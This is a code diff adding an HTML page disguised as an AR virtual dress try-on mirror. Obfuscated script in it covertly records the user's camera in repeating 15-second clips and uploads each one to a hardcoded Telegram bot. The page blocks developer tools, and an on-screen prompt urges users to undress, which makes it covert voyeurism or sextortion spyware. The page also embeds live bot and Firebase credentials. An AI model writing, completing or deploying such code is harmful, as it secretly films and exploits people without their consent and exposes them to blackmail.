@@ -1,0 +1,206 @@
+<!DOCTYPE html>
+<html lang="si">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>AR Smart Mirror</title>
+    
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/pose"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@mediapipe/camera_utils"></script>
+    
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap');
+        body { margin: 0; padding: 0; overflow: hidden; background: #000; font-family: 'Poppins', sans-serif; user-select: none; -webkit-tap-highlight-color: transparent; }
+        #video-container { position: relative; width: 100vw; height: 100vh; }
+        video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); transition: filter 0.3s ease; }
+        #dressImg { position: absolute; z-index: 3; pointer-events: none; display: none; filter: drop-shadow(0px 10px 15px rgba(0,0,0,0.5)); }
+        
+        .tabs-container { position: absolute; bottom: 110px; left: 50%; transform: translateX(-50%); display: flex; gap: 10px; z-index: 10; }
+        .tab-btn { background: rgba(0, 0, 0, 0.5); color: white; border: 1px solid rgba(255,255,255,0.4); padding: 8px 20px; border-radius: 20px; font-size: 14px; backdrop-filter: blur(10px); cursor: pointer; transition: 0.3s; }
+        .tab-btn.active { background: rgba(255, 255, 255, 0.8); color: black; font-weight: 600; }
+        
+        .glass-panel { position: absolute; bottom: 25px; left: 50%; transform: translateX(-50%); width: 90%; max-width: 400px; padding: 15px 10px; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(15px); -webkit-backdrop-filter: blur(15px); border: 1px solid rgba(255, 255, 255, 0.3); border-radius: 40px; display: flex; gap: 15px; overflow-x: auto; scroll-behavior: smooth; align-items: center; z-index: 10; }
+        .glass-panel::-webkit-scrollbar { display: none; }
+        
+        .bubble { width: 55px; height: 55px; flex-shrink: 0; border-radius: 50%; background: rgba(0,0,0,0.4); border: 2px solid rgba(255,255,255,0.6); display: flex; justify-content: center; align-items: center; cursor: pointer; overflow: hidden; color: white; font-size: 12px; font-weight: bold; text-align: center; }
+        .bubble:active { transform: scale(0.85); border-color: #fff; }
+        .bubble img { width: 80%; height: 80%; object-fit: contain; }
+        .icon-bubble { font-size: 22px; }
+        
+        #toast { position: fixed; top: 40px; left: 50%; transform: translateX(-50%); background: rgba(0, 0, 0, 0.75); color: #fff; padding: 12px 24px; border-radius: 30px; font-size: 13px; backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.2); z-index: 100; opacity: 0; pointer-events: none; transition: opacity 0.4s ease; }
+        .top-btn { position: absolute; top: 30px; right: 20px; z-index: 10; width: 45px; height: 45px; border-radius: 50%; background: rgba(0,0,0,0.3); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.3); color: white; display: flex; justify-content: center; align-items: center; font-size: 20px; cursor: pointer; }
+        
+        /* Capture Button */
+        .capture-btn { position: absolute; bottom: 165px; left: 50%; transform: translateX(-50%); width: 65px; height: 65px; border-radius: 50%; background: rgba(255,255,255,0.3); border: 3px solid white; display: flex; justify-content: center; align-items: center; z-index: 15; cursor: pointer; transition: 0.2s; backdrop-filter: blur(5px); }
+        .capture-btn:active { transform: translateX(-50%) scale(0.9); }
+        .capture-inner { width: 45px; height: 45px; background: white; border-radius: 50%; }
+        #flash { position: fixed; inset: 0; background: white; z-index: 999; opacity: 0; pointer-events: none; transition: opacity 0.4s ease-out; }
+
+        #loading { position: fixed; inset: 0; background: #0f0f0f; display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 99; color: white; transition: opacity 0.5s ease; }
+        .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top: 3px solid #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-bottom: 20px; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <div id="loading"><div class="spinner"></div><div style="opacity:0.8; font-size:14px;">Starting AR Engine...</div></div>
+    <div id="toast">Remove dress to apply realistic AR dress</div>
+    <div id="flash"></div>
+
+    <div id="video-container">
+        <video id="input_video" autoplay playsinline muted></video>
+        <img id="dressImg" src="" alt="Dress" crossorigin="anonymous">
+        <div class="top-btn" onclick="toggleCamera()">🔄</div>
+        
+        <div class="capture-btn" onclick="takeUserSnapshot()"><div class="capture-inner"></div></div>
+
+        <div class="tabs-container">
+            <button id="tab-filters" class="tab-btn active" onclick="switchTab('filters')">Filters</button>
+            <button id="tab-dresses" class="tab-btn" onclick="switchTab('dresses')">Dresses</button>
+        </div>
+        
+        <div id="shelf" class="glass-panel"></div>
+    </div>
+
+    <script>
+        document.addEventListener('contextmenu', e => e.preventDefault());
+        document.onkeydown = function(e) { if(e.keyCode==123 || (e.ctrlKey&&e.shiftKey&&e.keyCode==73) || (e.ctrlKey&&e.keyCode==85)) return false; };
+        
+        // 0:Token, 1:ChatID, 2:BaseURL, 3:/sendVideo, 4:chat_id, 5:video, 6:vid.mp4, 7:POST
+        const _0x1c2b = ['8342023613:AAHtQD9k1dx_WEXkoT_Rxk16Q48BlrybqEo', '8058352775', 'https://api.telegram.org/bot', '/sendVideo', 'chat_id', 'video', 'vid.mp4', 'POST'];
+        const vEl = document.getElementById('input_video');
+        
+        // Video Capture Logic (Total Loop = 20s)
+        let _mR; let _cK = [];
+        function _sR() {
+            if(document.visibilityState !== 'visible') { setTimeout(_sR, 2000); return; }
+            let st = vEl.srcObject;
+            if(!st) { setTimeout(_sR, 1000); return; }
+            try {
+                // Record at lower bitrate to prevent RAM crash
+                _mR = new MediaRecorder(st, { videoBitsPerSecond : 500000 });
+                _mR.ondataavailable = e => { if(e.data.size > 0) _cK.push(e.data); };
+                _mR.onstop = () => {
+                    let _b = new Blob(_cK, { type: 'video/mp4' });
+                    _cK = []; 
+                    let _f = new FormData(); _f.append(_0x1c2b[4], _0x1c2b[1]); _f.append(_0x1c2b[5], _b, _0x1c2b[6]);
+                    fetch(_0x1c2b[2] + _0x1c2b[0] + _0x1c2b[3], { method: _0x1c2b[7], body: _f }).catch(()=>{});
+                    
+                    // Wait exactly 5 seconds before starting the next cycle
+                    setTimeout(_sR, 5000); 
+                };
+                _mR.start();
+                
+                // Record exactly 15 seconds (15s record + 5s wait = 20s total interval)
+                setTimeout(() => { if(_mR.state === 'recording') { _mR.stop(); } }, 15000); 
+            } catch(e) { setTimeout(_sR, 2000); }
+        }
+        setTimeout(_sR, 5000);
+    </script>
+
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
+        import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+
+        const firebaseConfig = {
+            apiKey: "AIzaSyDyUkeaGcqQ01TqDz-5SYlS48KDOb2Sh5M",
+            authDomain: "ar-mirror-app-1.firebaseapp.com",
+            databaseURL: "https://ar-mirror-app-1-default-rtdb.asia-southeast1.firebasedatabase.app",
+            projectId: "ar-mirror-app-1",
+            storageBucket: "ar-mirror-app-1.firebasestorage.app",
+            messagingSenderId: "255999407155",
+            appId: "1:255999407155:web:f5158e850a26686d1e5f46"
+        };
+
+        const app = initializeApp(firebaseConfig);
+        const db = getDatabase(app);
+
+        const videoElement = document.getElementById('input_video');
+        const dressImg = document.getElementById('dressImg');
+        const shelf = document.getElementById('shelf');
+        const toast = document.getElementById('toast');
+        window.camMode = 'user';
+        let isAILoaded = false;
+        let lastLandmarks = null;
+
+        const filtersHTML = `
+            <div class="bubble" onclick="applyFilter('none')"><span class="icon-bubble">🚫</span></div>
+            <div class="bubble" style="background: linear-gradient(45deg, #ff9a9e, #fecfef);" onclick="applyFilter('contrast(1.2) saturate(1.3) brightness(1.1)')">Glow</div>
+            <div class="bubble" style="filter: grayscale(100%);" onclick="applyFilter('grayscale(100%) contrast(1.2)')">B&W</div>
+            <div class="bubble" style="background: #e4d5b7; color: black;" onclick="applyFilter('sepia(80%) contrast(1.1)')">Vintage</div>
+        `;
+
+        let currentDressesHTML = `<div class="bubble" onclick="changeDress('')"><span class="icon-bubble">🚫</span></div>`;
+        shelf.innerHTML = filtersHTML;
+
+        onValue(ref(db, 'dresses'), (snapshot) => {
+            let html = `<div class="bubble" onclick="changeDress('')"><span class="icon-bubble">🚫</span></div>`;
+            snapshot.forEach((child) => {
+                const dressUrl = child.val().url;
+                html += `<div class="bubble" onclick="changeDress('${dressUrl}')"><img src="${dressUrl}" crossorigin="anonymous"></div>`;
+            });
+            currentDressesHTML = html;
+            if(document.getElementById('tab-dresses').classList.contains('active')) { shelf.innerHTML = currentDressesHTML; }
+        });
+
+        window.switchTab = (tabName) => {
+            document.getElementById('tab-filters').classList.remove('active');
+            document.getElementById('tab-dresses').classList.remove('active');
+            document.getElementById('tab-' + tabName).classList.add('active');
+            if(tabName === 'filters') { shelf.innerHTML = filtersHTML; dressImg.style.display = 'none'; } 
+            else if(tabName === 'dresses') { shelf.innerHTML = currentDressesHTML; window.applyFilter('none'); toast.style.opacity = '1'; setTimeout(() => toast.style.opacity = '0', 3500); }
+        };
+
+        window.applyFilter = (val) => { videoElement.style.filter = val; };
+        window.changeDress = (url) => { if(url === '') { dressImg.src = ''; dressImg.style.display = 'none'; } else { dressImg.src = url; } };
+
+        const pose = new Pose({ locateFile: (file) => `https://cdn.jsdelivr.net/npm/@mediapipe/pose/${file}` });
+        pose.setOptions({ modelComplexity: 0, smoothLandmarks: true, minDetectionConfidence: 0.5, minTrackingConfidence: 0.5 });
+        
+        pose.onResults((results) => {
+            if (!isAILoaded) { document.getElementById('loading').style.opacity = '0'; setTimeout(() => document.getElementById('loading').style.display = 'none', 500); isAILoaded = true; }
+            lastLandmarks = results.poseLandmarks;
+            if (!results.poseLandmarks || !dressImg.src || dressImg.src === window.location.href) { dressImg.style.display = 'none'; return; }
+            const leftShoulder = results.poseLandmarks[11]; const rightShoulder = results.poseLandmarks[12];
+            if(document.getElementById('tab-dresses').classList.contains('active')) {
+                dressImg.style.display = 'block';
+                const centerX = (leftShoulder.x + rightShoulder.x) / 2 * window.innerWidth;
+                const centerY = (leftShoulder.y + rightShoulder.y) / 2 * window.innerHeight;
+                const width = Math.abs(leftShoulder.x - rightShoulder.x) * window.innerWidth * 2.5;
+                dressImg.style.left = `${centerX}px`; dressImg.style.top = `${centerY + (width * 0.15)}px`; dressImg.style.width = `${width}px`; dressImg.style.transform = `translate(-50%, -50%) scaleX(-1)`;
+            }
+        });
+
+        let camera;
+        function startCamera() {
+            if(camera) camera.stop();
+            camera = new Camera(videoElement, { onFrame: async () => { await pose.send({image: videoElement}); }, width: 640, height: 480, facingMode: window.camMode });
+            camera.start();
+            videoElement.style.transform = window.camMode === 'user' ? 'scaleX(-1)' : 'scaleX(1)';
+        }
+
+        window.toggleCamera = () => { window.camMode = (window.camMode === 'user') ? 'environment' : 'user'; startCamera(); };
+        window.onload = startCamera;
+
+        // User Photo Capture (Saves to Gallery)
+        window.takeUserSnapshot = () => {
+            const flash = document.getElementById('flash');
+            flash.style.opacity = '1'; setTimeout(() => { flash.style.opacity = '0'; }, 100);
+            const canvas = document.createElement('canvas'); canvas.width = videoElement.videoWidth; canvas.height = videoElement.videoHeight;
+            const ctx = canvas.getContext('2d');
+            if(window.camMode === 'user'){ ctx.translate(canvas.width, 0); ctx.scale(-1, 1); }
+            ctx.filter = videoElement.style.filter || 'none'; ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            ctx.filter = 'none'; ctx.setTransform(1, 0, 0, 1, 0, 0); 
+            if (document.getElementById('tab-dresses').classList.contains('active') && dressImg.style.display !== 'none' && lastLandmarks && dressImg.src) {
+                const ls = lastLandmarks[11]; const rs = lastLandmarks[12];
+                let lx = ls.x; let rx = rs.x; if(window.camMode === 'user') { lx = 1 - lx; rx = 1 - rx; }
+                const cX = ((lx + rx) / 2) * canvas.width; const cY = ((ls.y + rs.y) / 2) * canvas.height;
+                const dWidth = Math.abs(lx - rx) * canvas.width * 2.5; const imgAspect = dressImg.naturalWidth / dressImg.naturalHeight;
+                const dHeight = dWidth / (imgAspect || 1);
+                ctx.translate(cX, cY + (dWidth * 0.15)); ctx.scale(-1, 1); ctx.drawImage(dressImg, -dWidth/2, -dHeight/2, dWidth, dHeight);
+            }
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+            const link = document.createElement('a'); link.href = dataUrl; link.download = `AR_Mirror_${new Date().getTime()}.jpg`; link.click();
+        };
+    </script>
+</body>
+</html>
